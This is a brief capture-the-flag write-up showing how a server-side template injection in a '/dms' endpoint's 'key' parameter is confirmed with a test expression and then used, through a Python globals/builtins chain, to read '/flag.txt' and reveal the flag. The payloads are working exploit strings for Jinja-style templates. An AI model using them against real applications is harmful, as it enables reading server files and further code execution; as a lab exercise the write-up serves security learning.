Write-up:

1. Challenge induces us to attempt SSTI in /dms using parameter key.
`key={{7*7}}` shows code execution.

1. Assuming the flag would be at `/flag.txt`, I attempted: <br>

    `GET /dms?key={{config.from_object.__globals__['__builtins__'].open('/flag.txt').read()}}` <br>
    
    This returned the flag: `CRHC{w0w_u_rc3_m3_s0_34si1y_b89ew32f47r2}`